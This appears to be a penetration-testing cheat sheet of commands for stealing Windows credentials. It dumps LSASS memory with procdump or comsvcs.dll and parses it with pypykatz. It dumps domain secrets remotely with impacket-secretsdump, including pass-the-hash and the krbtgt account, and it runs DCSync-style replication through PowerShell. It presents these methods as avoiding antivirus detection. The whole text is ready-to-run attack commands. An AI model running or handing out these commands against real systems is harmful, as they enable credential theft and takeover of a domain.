### Procdump + Pypykatz (No AV Detection)
# On target (procdump is Microsoft signed)
procdump64.exe -accepteula -ma lsass.exe lsass.dmp

# Download dump to attacker
# On attacker (pypykatz is Python-based)
pip install pypykatz
pypykatz lsa minidump lsass.dmp

### Secretsdump (Impacket) - Remote Dumping
# Dump from remote machine without touching target disk
impacket-secretsdump domain/user:pass@TARGET

# Using pass-the-hash
impacket-secretsdump -hashes LM:NT domain/user@TARGET

# Dump only specific users
impacket-secretsdump -just-dc-user krbtgt domain/user:pass@TARGET

### LSASS via comsvcs.dll (Native Windows)
# Dump LSASS using comsvcs (no extra tools)
rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\lsass.dmp full

# Download dump
# Analyze with pypykatz offline

###Powershell ALternatives
# Get-NetPassword (from PowerSploit)
Get-NetPassword -Domain domain.local

# Get-ADReplAccount (DCSync)
Get-ADReplAccount -All -Domain domain.local -Server DC